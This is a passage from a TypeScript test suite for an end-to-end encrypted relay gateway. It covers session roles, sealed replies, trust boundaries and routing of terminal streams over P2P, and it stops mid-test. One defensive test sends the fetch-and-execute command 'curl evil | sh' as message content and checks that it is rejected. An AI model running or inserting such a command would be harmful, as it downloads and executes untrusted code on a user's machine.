/**
 * The gateway's rules, with real keys: what used to be one class (the socket held the link, the sessions
 * and the dispatch) is two, and these are the rules that crossed between them (docs/design/2026-10-06-core-boundary-next.md,
 * step 10). Each test fails if its rule is lost in the move: who a remote client is, as the core hears it;
 * that its role, never its frame, decides whether it is the owner; that its reply goes back sealed to it
 * alone; that a throw while sealing costs the relay its frame and nothing else; and the two trust edges the
 * split made visible, a window's connection id named by the relay and the backend hub's own frames sent by
 * a process on this computer. The rest of the relay's rules are held where they always were, through the
 * socket and its gateway together (backendSocket.spec.ts).
 */
import { afterEach, describe, expect, it, vi } from 'vitest'
import type { BackendSocket } from '../backendSocket.js'
import type { Asker } from '../core/api.js'
import * as C from '../lib/e2ee/core.js'
import { deriveTerminalBinaryKey, sealTerminalBinary } from '../lib/e2ee/terminalSeal.js'
import { TerminalBinaryKind, type TerminalBinaryClear } from '../lib/terminalBinary.js'
import { bindMessageRequest } from '../testing/socketCore.js'
import { dispatchDown, gatewayOf, relaySocket, upstreamOf } from '../testing/relaySocket.js'
import type { DeviceLogTrustOutcome } from '../lib/e2ee/deviceLogSyncer.js'
import { unknownHelloReader } from './start.js'
import { env } from '../config/env.js'

/** The machine the sessions are bound to: every hello and welcome is signed over it. */
const MACHINE = 'a1b2c3d4e5f60718293a4b5c6d7e8f90'

afterEach(() => vi.restoreAllMocks())

it('passes only lifecycle scalars to product reporting and keeps relaying if reporting fails', async () => {
  const socket = relaySocket(MACHINE)
  const gateway = gatewayOf(socket)
  const observe = vi.fn()
  gateway.productUsage = { observe, opened: vi.fn(), presence: vi.fn() }
  gateway.broadcast({ type: 'turn_ended', agentId: 'fixture-agent', payload: { aborted: true, content: 'PRIVATE_CANARY' } })
  expect(observe).toHaveBeenCalledWith('turn_ended', 'fixture-agent', false, true)
  gateway.broadcast({ type: 'text_delta', agentId: 'fixture-agent', payload: { text: 'PRIVATE_CANARY' } })
  expect(observe).toHaveBeenCalledWith('text_delta', 'fixture-agent', false, false)
  gateway.broadcast({ type: 'error', agentId: 'fixture-agent', payload: { message: 'PRIVATE_CANARY' } })
  expect(observe).toHaveBeenCalledWith('error', 'fixture-agent', false, false)
  expect(JSON.stringify(observe.mock.calls)).not.toContain('PRIVATE_CANARY')
  // An agent's launch state, from its frame: the state and a listed code, never the frame or its words.
  const launchState = vi.fn()
  gateway.productUsage = { observe, opened: vi.fn(), presence: vi.fn(), launchState }
  gateway.broadcast({ type: 'agent_synced', payload: { agent: { id: 'fixture-agent', name: 'PRIVATE_CANARY',
    launch: { state: 'failed', error: 'START_TIMEOUT', detail: 'PRIVATE_CANARY' } } } })
  gateway.broadcast({ type: 'agent_synced', payload: { agent: { id: 'fixture-agent', launch: { state: 'PRIVATE_CANARY' } } } })
  gateway.broadcast({ type: 'agent_synced', payload: { agent: { name: 'no id' } } })
  gateway.broadcast({ type: 'agent_renamed', payload: { agentId: 'fixture-agent', name: 'PRIVATE_CANARY' } })
  expect(launchState.mock.calls).toEqual([['fixture-agent', 'failed', 'start_timeout'], ['fixture-agent', 'other', undefined]])
  const fail = () => { throw new Error('Reporting unavailable') }
  expect(() => { gateway.productUsage = { observe, opened: vi.fn(), presence: vi.fn(), launchState: fail }; gateway.broadcast({ type: 'agent_synced', payload: { agent: { id: 'a', launch: { state: 'ready' } } } }) }).not.toThrow()
  gateway.productUsage = { observe: fail, opened: fail, presence: fail, counter: fail, launch: fail }
  expect(() => gateway.usageCounter('create_requests')).not.toThrow()
  expect(() => gateway.usageLaunch({ id: 'synthetic-creation-1', phase: 'start' })).not.toThrow()
  expect(() => gateway.broadcast({ type: 'turn_started', agentId: 'fixture-agent' })).not.toThrow()
  expect(() => gateway.windowOpened('desktop')).not.toThrow()
  expect(() => gateway.localClients({ desktop: 1, tui: 0 })).not.toThrow()
  await socket.stop()
})

type Frame = Record<string, unknown>

/** What the gateway queued for the relay, addressed to one connection. */
const queuedFor = (socket: BackendSocket, connId: string): Frame[] =>
  upstreamOf(socket).queue.map((item) => item.msg as { targetConnId?: string; frame?: Frame })
    .filter((msg) => msg.targetConnId === connId).map((msg) => msg.frame!)

/** A paired client with a live session on `connId`: it proves its identity with a hello and reads the
 *  welcome, as the phone app does, so what it seals opens under the gateway's real session. */
async function pairedClient(socket: BackendSocket, connId: string, opts: { role?: 'web' | 'device'; label?: string; shared?: boolean } = {}) {
  const gateway = gatewayOf(socket)
  const identity = C.newIdentity()
  const pub = C.b64e(identity.pub)
  const store = (gateway.e2ee as unknown as { store: { addPaired(pub: string, label: string, at: number, role: string, peer?: { shared?: boolean }): void } }).store
  store.addPaired(pub, opts.label ?? 'Dee’s phone', Date.now(), opts.role ?? 'web', { shared: opts.shared })
  const eph = C.newEphemeral()
  await dispatchDown(socket, { type: 'e2e_hello', payload: { identityPub: pub, ephPub: C.b64e(eph.pub), sig: C.b64e(C.helloSig(identity.priv, MACHINE, eph.pub)) } }, connId)
  // The latest: a second hello on a connection replaces its session.
  const welcome = queuedFor(socket, connId).filter((frame) => frame.type === 'e2e_welcome').at(-1)!
  const p = welcome.payload as Record<string, string>
  const keys = C.sessionKeys(eph.priv, C.b64d(p.ephPub), MACHINE, eph.pub, C.b64d(p.ephPub))
  let sent = 0
  let sentBinary = 0
  return {
    pub,
    seal: (type: string, payload: Record<string, unknown>): Frame => ({ type, payload: C.wrapPayload(keys.c2s, 'p', sent++, type, undefined, payload) }),
    /** Terminal bytes, sealed as the app seals a keystroke. */
    sealBinary: (frame: TerminalBinaryClear): Uint8Array => sealTerminalBinary(deriveTerminalBinaryKey(keys.c2s), sentBinary++, frame)!,
    open: (frame: Frame): unknown => C.unwrapPayload(keys.s2c, (frame.payload as C.WrappedPayload).__e2e, String(frame.type), undefined),
  }
}

describe('a remote client, as the core hears it', () => {
  it('is registered with the role and label its session proved, and forgotten when the relay says it left', async () => {
    const socket = relaySocket(MACHINE)
    expect(socket.remoteClient('phone-1')).toBeNull()
    const phone = await pairedClient(socket, 'phone-1', { label: 'Dee’s phone' })
    expect(socket.remoteClient('phone-1')).toEqual({ role: 'web', label: 'Dee’s phone', identity: phone.pub, direct: false, accountOwner: true })
    await dispatchDown(socket, { type: '__client_disconnected', payload: {} }, 'phone-1')
    expect(socket.remoteClient('phone-1')).toBeNull()
    await socket.stop()
  })

  it('asks as the owner only with a web session, whatever its frame says', async () => {
    const socket = relaySocket(MACHINE)
    const asked: Array<{ type: string; asker: Asker }> = []
    socket.serviceRouter = (type, _payload, asker, reply) => { asked.push({ type, asker }); reply({ ok: true }); return true }
    const phone = await pairedClient(socket, 'phone-1', { role: 'web' })
    const dial = await pairedClient(socket, 'dial-1', { role: 'device', label: 'Desk dial' })
    const colleague = await pairedClient(socket, 'colleague', { shared: true })
    // A field in the payload claiming the owner's role is the sender's word; the session is the gateway's.
    await dispatchDown(socket, phone.seal('dsh_list', { requestId: 'p', owner: false }), 'phone-1')
    await dispatchDown(socket, dial.seal('dsh_list', { requestId: 'd', owner: true, local: true, role: 'web', accountOwner: true }), 'dial-1')
    // A colleague the machine is shared with is a guest (core/guestPolicy.ts): never the owner, whatever it says. Its
    // `dsh_list` is refused before any service hears it; what a guest may ask is asked as that guest.
    await dispatchDown(socket, colleague.seal('dsh_list', { requestId: 'c', owner: true, local: true, accountOwner: true }), 'colleague')
    await dispatchDown(socket, colleague.seal('usage_read', { requestId: 'u', owner: true, local: true, accountOwner: true }), 'colleague')
    // With the connection and the request id it asked under, which a service keys a connection's own work by.
    expect(asked).toEqual([
      { type: 'dsh_list', asker: { local: false, owner: true, accountOwner: true, connection: 'phone-1', requestId: 'p' } },
      { type: 'dsh_list', asker: { local: false, owner: false, accountOwner: false, connection: 'dial-1', requestId: 'd' } },
      { type: 'usage_read', asker: expect.objectContaining({ local: false, owner: false, accountOwner: false, connection: 'colleague', requestId: 'u' }) },
    ])
    await socket.stop()
  })

  it('gets its reply sealed to it alone: no other client and no window hears it', async () => {
    const socket = relaySocket(MACHINE)
    const window: Frame[] = []
    socket.registerLocalClient('local:window', { sendFrame: (frame) => { window.push(frame); return true }, sendBinary: () => true })
    socket.serviceRouter = (_type, _payload, _asker, reply) => { reply({ harnesses: ['secret-harness'] }); return true }
    const phone = await pairedClient(socket, 'phone-1')
    await pairedClient(socket, 'phone-2')
    await dispatchDown(socket, phone.seal('dsh_list', { requestId: 'r-1' }), 'phone-1')
    const replies = queuedFor(socket, 'phone-1').filter((frame) => frame.type === 'dsh_list_result')
    expect(replies).toHaveLength(1)
    expect(JSON.stringify(replies)).not.toContain('secret-harness')
    expect(phone.open(replies[0])).toEqual({ requestId: 'r-1', harnesses: ['secret-harness'] })
    expect(JSON.stringify(queuedFor(socket, 'phone-2'))).not.toContain('dsh_list_result')
    expect(JSON.stringify(upstreamOf(socket).queue.filter((item) => !(item.msg as { targetConnId?: string }).targetConnId))).not.toContain('secret-harness')
    expect(window.filter((frame) => frame.type === 'dsh_list_result')).toEqual([])
    await socket.unregisterLocalClient('local:window')
    await socket.stop()
  })

  it('whose session went while its request ran gets a bare E2EE_REQUIRED, never the answer in the clear', async () => {
    const socket = relaySocket(MACHINE)
    let answer!: (result: Record<string, unknown>) => void
    socket.serviceRouter = (_type, _payload, _asker, reply) => { answer = reply; return true }
    const phone = await pairedClient(socket, 'phone-1')
    await dispatchDown(socket, phone.seal('dsh_list', { requestId: 'r-1' }), 'phone-1')
    gatewayOf(socket).e2ee.dropSession('phone-1')
    expect(socket.remoteClient('phone-1')).toBeNull()
    answer({ harnesses: ['secret-harness'] })
    expect(queuedFor(socket, 'phone-1').filter((frame) => frame.type === 'dsh_list_result'))
      .toEqual([{ type: 'dsh_list_result', payload: { requestId: 'r-1', error: 'E2EE_REQUIRED' } }])
    await socket.stop()
  })
})

describe('sealing, guarded', () => {
  it('a throw while the gateway seals a frame costs the relay that frame, never the windows here or the caller', async () => {
    const socket = relaySocket(MACHINE)
    const window: Frame[] = []
    const error = vi.spyOn(console, 'error').mockImplementation(() => {})
    socket.registerLocalClient('local:window', { sendFrame: (frame) => { window.push(frame); return true }, sendBinary: () => true })
    const e2ee = gatewayOf(socket).e2ee
    vi.spyOn(e2ee, 'wrapUp').mockImplementation(() => { throw new Error('sealing broke') })
    vi.spyOn(e2ee, 'wrapCommander').mockImplementation(() => { throw new Error('sealing broke') })
    // The event funnel sends every event of a batch in turn: one that cannot be sealed must not stop the next.
    expect(() => {
      socket.send({ type: 'turn_started', agentId: 'a1', payload: { userMessage: 'one' } })
      socket.sendCommander({ type: 'commander_event', agentId: 'a1', payload: { kind: 'processing' } })
      socket.send({ type: 'turn_ended', agentId: 'a1', payload: {} })
    }).not.toThrow()
    expect(window.map((frame) => frame.type)).toEqual(['turn_started', 'turn_ended'])
    // Said once, then counted, so a broken seal does not flood the log with one line per event.
    expect(error).toHaveBeenCalledTimes(1)
    expect(String(error.mock.calls[0][0])).toContain('sealing broke')
    // A terminal frame that cannot be sealed is one that was not sent: its stream closes, nothing throws.
    vi.spyOn(e2ee, 'wrapTarget').mockImplementation(() => { throw new Error('sealing broke') })
    vi.spyOn(e2ee, 'wrapTerminalBinary').mockImplementation(() => { throw new Error('sealing broke') })
    expect(socket.sendTerminalTo('phone-1', 'terminal_ready', { streamId: 's' })).toBe(false)
    expect(socket.sendTerminalBinaryTo('phone-1', { kind: TerminalBinaryKind.output, streamId: 's', seq: 1, compressed: false, bytes: new Uint8Array(1) })).toBe(false)
    expect(error).toHaveBeenCalledTimes(1)
    // And the relay is not wedged: once sealing works, frames go out again.
    vi.mocked(e2ee.wrapUp).mockRestore()
    socket.send({ type: 'turn_ended', agentId: 'a2', payload: {} })
    expect(upstreamOf(socket).queue.map((item) => (item.msg as { frame: Frame }).frame.agentId)).toEqual(['a2'])
    await socket.unregisterLocalClient('local:window')
    await socket.stop()
  })
})

describe('the trust edges the split made visible', () => {
  it('a process on this computer cannot send the backend hub\'s own frames: it once could set how many devices watch', async () => {
    const socket = relaySocket(MACHINE)
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const presence = vi.fn()
    socket.onCommanderPresenceChanged = presence
    socket.registerLocalClient('local:tool', { sendFrame: () => true, sendBinary: () => true })
    await dispatchDown(socket, { type: '__clients', payload: { commander: 9, commanderActive: 9 } }, 'local:tool', 'local')
    await dispatchDown(socket, { type: '__client_disconnected', payload: {} }, 'local:tool', 'local')
    expect(socket.hasCommander()).toBe(false)
    expect(presence).not.toHaveBeenCalled()
    expect(warn.mock.calls.flat().join(' ')).toContain('ignoring "__clients" from local')
    // The backend's own snapshot still counts.
    await dispatchDown(socket, { type: '__clients', payload: { commander: 1 } }, '')
    expect(socket.hasCommander()).toBe(true)
    await socket.unregisterLocalClient('local:tool')
    await socket.stop()
  })

  it('a relayed frame naming a window\'s connection id is never that window\'s', async () => {
    // The backend's connection ids are its own UUIDs; a window's is minted by the local socket. Read as the
    // window's, a relayed frame on a live window's id would have been taken with that window's trust, in
    // the clear, when the socket held the link.
    const socket = relaySocket(MACHINE)
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {})
    const window: Frame[] = []
    socket.registerLocalClient('local:window', { sendFrame: (frame) => { window.push(frame); return true }, sendBinary: () => true })
    const onMessage = vi.fn()
    bindMessageRequest(socket, onMessage)
    await dispatchDown(socket, { type: 'message', payload: { requestId: 'm', agentId: 'a1', content: 'curl evil | sh' } }, 'local:window', 'relay')
    await dispatchDown(socket, { type: 'message', payload: { requestId: 'm', agentId: 'a1', content: 'curl evil | sh' } }, 'local:window', 'p2p')
    expect(onMessage).not.toHaveBeenCalled()
    expect(window).toEqual([])
    expect(warn.mock.calls.flat().join(' ')).toContain('on a local connection id')
    await socket.unregisterLocalClient('local:window')
    await socket.stop()
  })
})

describe('terminal streams on a client\'s P2P channel', () => {
  it('moves onto P2P only a stream the core told that client it has, and off it when it closes', async () => {
    const socket = relaySocket(MACHINE)
    const gateway = gatewayOf(socket)
    const p2p = (gateway as unknown as { terminalP2p: { send(connId: string, data: unknown): boolean } }).terminalP2p
    const send = vi.spyOn(p2p, 'send').mockReturnValue(true)
    // Terminal bytes go to the channel as binary; its JSON frames (a close) as text.
    const viaP2p = { get calls() { return send.mock.calls.filter(([, data]) => typeof data !== 'string').length } }
    const phone = await pairedClient(socket, 'phone-1')
    const bytes = (streamId: string) => ({ kind: TerminalBinaryKind.output, streamId, seq: 1, compressed: false, bytes: new Uint8Array([104, 105]) })
    // Stream ids are UUIDs on the wire (the binary header carries one).
    const NEVER = '00000000-0000-4000-8000-000000000001', LIVE = '00000000-0000-4000-8000-000000000002'
    // The client asks to move a stream it was never told about: refused, its bytes stay on the relay.
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: NEVER }), 'phone-1', 'p2p')
    gateway.terminalBinary('phone-1', bytes(NEVER))
    expect(viaP2p.calls).toBe(0)
    // Told it has one, it may move it.
    expect(gateway.terminal('phone-1', 'terminal_ready', { requestId: 'open-1', streamId: LIVE })).toBe(false) // no link: nothing sent
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: LIVE }), 'phone-1', 'p2p')
    gateway.terminalBinary('phone-1', bytes(LIVE))
    expect(viaP2p.calls).toBe(1)
    // Closed, it is off P2P: a resync for it cannot put it back.
    gateway.terminal('phone-1', 'terminal_closed', { streamId: LIVE })
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: LIVE }), 'phone-1', 'p2p')
    gateway.terminalBinary('phone-1', bytes(LIVE))
    expect(viaP2p.calls).toBe(1)
    await socket.stop()
  })

  /** A phone with one live stream, and a way to tell which wire that stream's output takes. */
  async function streamOnPhone() {
    const socket = relaySocket(MACHINE)
    const gateway = gatewayOf(socket)
    const p2p = (gateway as unknown as { terminalP2p: { send(connId: string, data: unknown): boolean } }).terminalP2p
    const send = vi.spyOn(p2p, 'send').mockReturnValue(true)
    const log = vi.spyOn(console, 'log').mockImplementation(() => {})
    const phone = await pairedClient(socket, 'phone-1')
    const STREAM = '00000000-0000-4000-8000-000000000003'
    gateway.terminal('phone-1', 'terminal_ready', { requestId: 'open-1', streamId: STREAM })
    const outputRides = (): 'p2p' | 'relay' => {
      const before = send.mock.calls.length
      gateway.terminalBinary('phone-1', { kind: TerminalBinaryKind.output, streamId: STREAM, seq: 1, compressed: false, bytes: new Uint8Array([104]) })
      return send.mock.calls.length > before ? 'p2p' : 'relay'
    }
    const logged = () => log.mock.calls.map((call) => String(call[0])).filter((line) => line.startsWith('[terminal-p2p]'))
    return { socket, gateway, phone, STREAM, outputRides, logged }
  }

  it.each(['terminal_ack', 'terminal_alive', 'terminal_resize', 'terminal_scroll', 'terminal_resync'])(
    'keeps a stream on P2P when a relay %s the client sealed before moving it arrives after the move',
    async (type) => {
      // 2026-10-15: the phone's relay ack, sealed ~16ms before its P2P resync, reached the machine after it
      // and took the stream back off P2P; the phone saw relay output and dropped its whole channel.
      const { socket, phone, STREAM, outputRides, logged } = await streamOnPhone()
      const stale = phone.seal(type, { streamId: STREAM, lastSeq: 1, resizeSeq: 1, cols: 80, rows: 24, direction: 'up', lines: 1 })
      const move = phone.seal('terminal_resync', { streamId: STREAM })
      await dispatchDown(socket, move, 'phone-1', 'p2p')
      expect(outputRides()).toBe('p2p')
      await dispatchDown(socket, stale, 'phone-1', 'relay')
      expect(outputRides()).toBe('p2p')
      expect(logged()).toEqual([
        '[terminal-p2p] conn=phone-1 stream=00000000 route=p2p by=terminal_resync n=1',
        `[terminal-p2p] conn=phone-1 stream=00000000 kept on p2p: relay "${type}" n=0 was sealed before the move (n=1)`,
      ])
      await socket.stop()
    },
  )

  it('says a stale relay frame once per move, not once per frame', async () => {
    const { socket, phone, STREAM, logged } = await streamOnPhone()
    const stale = [phone.seal('terminal_ack', { streamId: STREAM, lastSeq: 1 }), phone.seal('terminal_ack', { streamId: STREAM, lastSeq: 2 })]
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: STREAM }), 'phone-1', 'p2p')
    for (const frame of stale) await dispatchDown(socket, frame, 'phone-1', 'relay')
    expect(logged().filter((line) => line.includes('kept on p2p'))).toHaveLength(1)
    await socket.stop()
  })

  it('moves a stream back to the relay on a relay frame sealed after the move, and says so', async () => {
    // The phone's quiet one-stream demotion sends no resync: its next ack over the relay is the whole signal.
    const { socket, phone, STREAM, outputRides, logged } = await streamOnPhone()
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: STREAM }), 'phone-1', 'p2p')
    await dispatchDown(socket, phone.seal('terminal_ack', { streamId: STREAM, lastSeq: 1 }), 'phone-1', 'relay')
    expect(outputRides()).toBe('relay')
    expect(logged().at(-1)).toBe('[terminal-p2p] conn=phone-1 stream=00000000 route=relay by="terminal_ack" n=1')
    // And it may move onto P2P again with a newer resync.
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: STREAM }), 'phone-1', 'p2p')
    expect(outputRides()).toBe('p2p')
    await socket.stop()
  })

  it('keeps a stream on the relay when the client\'s newer relay resync overtakes an older P2P one', async () => {
    // A P2P channel that stalled (an SCTP retransmit takes a second) delivers late: the client had already
    // moved the stream back, and a resync it sealed before that must not move it onto P2P again.
    const { socket, phone, STREAM, outputRides } = await streamOnPhone()
    const olderMove = phone.seal('terminal_resync', { streamId: STREAM })
    const newerBack = phone.seal('terminal_resync', { streamId: STREAM })
    await dispatchDown(socket, newerBack, 'phone-1', 'relay')
    await dispatchDown(socket, olderMove, 'phone-1', 'p2p')
    expect(outputRides()).toBe('relay')
    await socket.stop()
  })

  it('starts a stream opened over P2P on P2P, at the open\'s counter', async () => {
    const socket = relaySocket(MACHINE)
    const gateway = gatewayOf(socket)
    const p2p = (gateway as unknown as { terminalP2p: { send(connId: string, data: unknown): boolean } }).terminalP2p
    const send = vi.spyOn(p2p, 'send').mockReturnValue(true)
    vi.spyOn(console, 'log').mockImplementation(() => {})
    const phone = await pairedClient(socket, 'phone-1')
    const STREAM = '00000000-0000-4000-8000-000000000004'
    await dispatchDown(socket, phone.seal('terminal_open', { requestId: 'open-p2p', agentId: 'a1', cols: 80, rows: 24 }), 'phone-1', 'p2p')
    gateway.terminal('phone-1', 'terminal_ready', { requestId: 'open-p2p', streamId: STREAM })
    const before = send.mock.calls.length
    gateway.terminalBinary('phone-1', { kind: TerminalBinaryKind.output, streamId: STREAM, seq: 1, compressed: false, bytes: new Uint8Array([104]) })
    expect(send.mock.calls.length).toBe(before + 1)
    // A relay frame sealed after the open is the client moving it back.
    await dispatchDown(socket, phone.seal('terminal_ack', { streamId: STREAM, lastSeq: 1 }), 'phone-1', 'relay')
    gateway.terminalBinary('phone-1', { kind: TerminalBinaryKind.output, streamId: STREAM, seq: 2, compressed: false, bytes: new Uint8Array([104]) })
    expect(send.mock.calls.length).toBe(before + 1)
    await socket.stop()
  })

  it('counts a new session on the same connection from the start again', async () => {
    // A hello on a connection replaces its session, and the new session's counters begin at 0: a counter
    // kept from the old one would have pinned the stream to P2P for good.
    const { socket, phone, STREAM, outputRides } = await streamOnPhone()
    for (let i = 0; i < 4; i++) phone.seal('terminal_alive', { streamId: STREAM })
    await dispatchDown(socket, phone.seal('terminal_resync', { streamId: STREAM }), 'phone-1', 'p2p')
    expect(outputRides()).toBe('p2p')
    const again = await pairedClient(socket, 'phone-1')
    await dispatchDown(socket, again.seal('terminal_ack', { streamId: STREAM, lastSeq: 1 }), 'phone-1', 'relay')
    expect(outputRides()).toBe('relay')
    await socket.stop()
  })
})

describe('a client\'s terminal bytes, on their way to the core', () => {
  const STREAM = '00000000-0000-4000-8000-000000000005'
  const key = (seq: number): TerminalBinaryClear => ({ kind: TerminalBinaryKind.input, streamId: STREAM, seq, bytes: new TextEncoder().encode(`k${seq}`), compressed: false })

  /** The gateway's own way in, as the backend link and a P2P channel feed it — in line, not dispatched directly. */
  const arrive = (socket: ReturnType<typeof relaySocket>) => {
    const gateway = gatewayOf(socket) as unknown as {
      enqueueDown(frame: Frame, connId: string, transport: 'relay' | 'p2p'): void
      enqueueTerminalBinary(connId: string, raw: Uint8Array): void
    }
    return {
      frame: (frame: Frame, transport: 'relay' | 'p2p' = 'relay') => gateway.enqueueDown(frame, 'phone-1', transport),
      bytes: (raw: Uint8Array) => gateway.enqueueTerminalBinary('phone-1', raw),
    }
  }

  it('reach the core while the client\'s P2P offer is still being answered', async () => {
    // Answering an offer awaits a STUN race and ICE gathering, 0.1–0.7s and up to 5s; in line with the
    // rest, it held every keystroke the client sent after it.
    const socket = relaySocket(MACHINE)
    const phone = await pairedClient(socket, 'phone-1')
    const p2p = (gatewayOf(socket) as unknown as { terminalP2p: { handleSignal(connId: string, type: string, value: unknown): Promise<boolean> } }).terminalP2p
    let answered!: () => void
    const answering = new Promise<void>((resolve) => { answered = resolve })
    const signals: string[] = []
    vi.spyOn(p2p, 'handleSignal').mockImplementation(async (_connId, type) => { signals.push(type); if (type === 'p2p_offer') await answering; return true })
    const core = vi.spyOn(socket.fromGateway, 'binary').mockImplementation(() => {})
    const into = arrive(socket)
    into.frame(phone.seal('p2p_offer', { sessionId: 's1', sdp: 'v=0', protocolVersion: 1 }))
    into.frame(phone.seal('p2p_ice_candidate', { sessionId: 's1', candidate: null, protocolVersion: 1 }))
    into.bytes(phone.sealBinary(key(1)))
    await vi.waitFor(() => expect(signals).toEqual(['p2p_offer']))
    expect(core).toHaveBeenCalledWith('phone-1', key(1))
    // The candidate still waits for its offer: it has no responder to reach before the answer.
    answered()
    await vi.waitFor(() => expect(signals).toEqual(['p2p_offer', 'p2p_ice_candidate']))
    await socket.stop()
  })

  it('reach the core while the client\'s requests wait at the gate, and are opened under the session they were sealed for', async () => {
    // A hello that replaces the session, still waiting in line, must not leave the bytes sealed under the
    // old one unopenable.
    const socket = relaySocket(MACHINE)
    const phone = await pairedClient(socket, 'phone-1')
    const core = vi.spyOn(socket.fromGateway, 'binary').mockImplementation(() => {})
    socket.holdRequests()
    const into = arrive(socket)
    const identity = C.newIdentity()
    const eph = C.newEphemeral()
    into.frame({ type: 'e2e_hello', payload: { identityPub: C.b64e(identity.pub), ephPub: C.b64e(eph.pub), sig: C.b64e(C.helloSig(identity.priv, MACHINE, eph.pub)) } })
    into.bytes(phone.sealBinary(key(1)))
    into.bytes(phone.sealBinary(key(2)))
    expect(core.mock.calls).toEqual([['phone-1', key(1)], ['phone-1', key(2)]])
    socket.openRequests()
    await socket.stop()
  })

  it('that no session opens are refused with the session-gone notice, not passed on', async () => {
    const socket = relaySocket(MACHINE)
    const phone = await pairedClient(socket, 'phone-1')
    const core = vi.spyOn(socket.fromGateway, 'binary').mockImplementation(() => {})
    gatewayOf(socket).e2ee.dropSession('phone-1')
    arrive(socket).bytes(phone.sealBinary(key(1)))
    expect(core).not.toHaveBeenCalled()
    expect(queuedFor(socket, 'phone-1').at(-1)).toEqual({ type: 'e2e_session_unknown', payload: { refused: { type: 'terminal_binary', kind: TerminalBinaryKind.input, n: 0 } } })
    await socket.stop()
  })

  it('are traced with the wire they came on while tracing is on, never with what they carry', async () => {
    const socket = relaySocket(MACHINE)
    const phone = await pairedClient(socket, 'phone-1')
    vi.spyOn(socket.fromGateway, 'binary').mockImplementation(() => {})
    const log = vi.spyOn(console, 'log').mockImplementation(() => {})
    const was = env.TYPING_TRACE
    ;(env as { TYPING_TRACE: boolean }).TYPING_TRACE = true
    try {
      const gateway = gatewayOf(socket) as unknown as { handleP2pData(connId: string, data: Uint8Array): void }
      arrive(socket).bytes(phone.sealBinary(key(1)))
      gateway.handleP2pData('phone-1', phone.sealBinary(key(2)))
      arrive(socket).bytes(phone.sealBinary({ ...key(3), kind: TerminalBinaryKind.paste }))
      const traced = log.mock.calls.map((call) => String(call[0])).filter((line) => line.startsWith('[typing]'))
      expect(traced).toEqual([
        '[typing] in conn=phone-1 stream=00000000 seq=1 2B via=relay',
        '[typing] in conn=phone-1 stream=00000000 seq=2 2B via=p2p',
        '[typing] in conn=phone-1 stream=00000000 paste 2B via=relay',
      ])
      expect(traced.join('\n')).not.toMatch(/k1|k2|k3/)
    } finally {
      ;(env as { TYPING_TRACE: boolean }).TYPING_TRACE = was
      await socket.stop()
    }
  })

  it('that the core fails on are said in the log, and the next ones still go', async () => {
    const socket = relaySocket(MACHINE)
    const phone = await pairedClient(socket, 'phone-1')
    const error = vi.spyOn(console, 'error').mockImplementation(() => {})
    const core = vi.spyOn(socket.fromGateway, 'binary')
      .mockImplementationOnce(() => Promise.reject(new Error('core gone')))
      .mockImplementationOnce(() => { throw new Error('core threw') })
      .mockImplementation(() => {})
    const into = arrive(socket)
    into.bytes(phone.sealBinary(key(1)))
    into.bytes(phone.sealBinary(key(2)))
    into.bytes(phone.sealBinary(key(3)))
    expect(core).toHaveBeenCalledTimes(3)
    await vi.waitFor(() => expect(error.mock.calls).toEqual([
      ['[backend] binary terminal dispatch failed:', 'core threw'],
      ['[backend] binary terminal dispatch failed:', 'core gone'],
    ]))
    await socket.stop()
  })
})

describe('the Wi-Fi device, over the gateway\'s sessions', () => {
  it('an unpaired device is told so, sealed, while its session still stands, and the service forgets it after', async () => {
    // The device clears its own pin on this frame; told after its session is gone, it could not open it
    // and would show "paired, disconnected" for ever (lib/autonomous-device/relay.ts `revoke`).
    const socket = relaySocket(MACHINE)
    const gateway = gatewayOf(socket)
    const revoked = vi.fn()
    socket.fromGateway.deviceRevoked = revoked
    const dial = await pairedClient(socket, 'dial-1', { role: 'device', label: 'Desk dial' })
    gateway.deviceClient('dial-1', dial.pub)
    gateway.revoke(C.fingerprint(C.b64d(dial.pub)))
    const told = queuedFor(socket, 'dial-1').map((frame) => frame.type)
    expect(told.indexOf('autonomous_device_event')).toBeGreaterThanOrEqual(0)
    expect(told.indexOf('autonomous_device_event')).toBeLessThan(told.indexOf('e2e_denied'))
    const event = queuedFor(socket, 'dial-1').find((frame) => frame.type === 'autonomous_device_event')!
    expect(dial.open(event)).toEqual({ type: 'pair.revoke', machineId: MACHINE })
    // The service hears of it once the session is gone, so its relay has nobody left to tell twice.
    expect(revoked).not.toHaveBeenCalled()
    expect(socket.remoteClient('dial-1')).toBeNull()
    await new Promise((done) => setImmediate(done))
    expect(revoked).toHaveBeenCalledWith(dial.pub)
    await socket.stop()
  })

  it('opens a device\'s request only when the relay would, and hands it on with the frame as it came', async () => {
    const socket = relaySocket(MACHINE)
    const heard = vi.fn()
    socket.fromGateway.device = heard
    const dial = await pairedClient(socket, 'dial-1', { role: 'device', label: 'Desk dial' })
    const phone = await pairedClient(socket, 'phone-1')
    const sealed = dial.seal('autonomous_device_request', { type: 'hello', proto: 1, requestId: 'h' })
    await dispatchDown(socket, sealed, 'dial-1')
    expect(heard).toHaveBeenLastCalledWith('dial-1', sealed, { type: 'autonomous_device_request', payload: { type: 'hello', proto: 1, requestId: 'h' } })
    // A web session's, an unsealed one, or one beside a session id: never opened, as the relay never did.
    const fromPhone = phone.seal('autonomous_device_request', { type: 'hello' })
    await dispatchDown(socket, fromPhone, 'phone-1')
    expect(heard).toHaveBeenLastCalledWith('phone-1', fromPhone, null)
    await dispatchDown(socket, { type: 'autonomous_device_request', payload: { type: 'hello' } }, 'dial-1')
    expect(heard.mock.lastCall?.[2]).toBeNull()
    const withSession = { ...dial.seal('autonomous_device_request', { type: 'hello' }), dbSessionId: 's1' }
    await dispatchDown(socket, withSession, 'dial-1')
    expect(heard.mock.lastCall?.[2]).toBeNull()
    await socket.stop()
  })
})

describe('a hello from a key the device key log may name', () => {
  it('waits for the gateway to read the log, and opens the session the read trusted', async () => {
    const socket = relaySocket(MACHINE)
    const gateway = gatewayOf(socket)
    const identity = C.newIdentity()
    const pub = C.b64e(identity.pub)
    const asked: string[] = []
    gateway.onUnknownHello = async (key) => { asked.push(key); gateway.trustPeer({ pub: key, label: 'Chrome · macOS', kind: 'viewer' }) }
    const eph = C.newEphemeral()
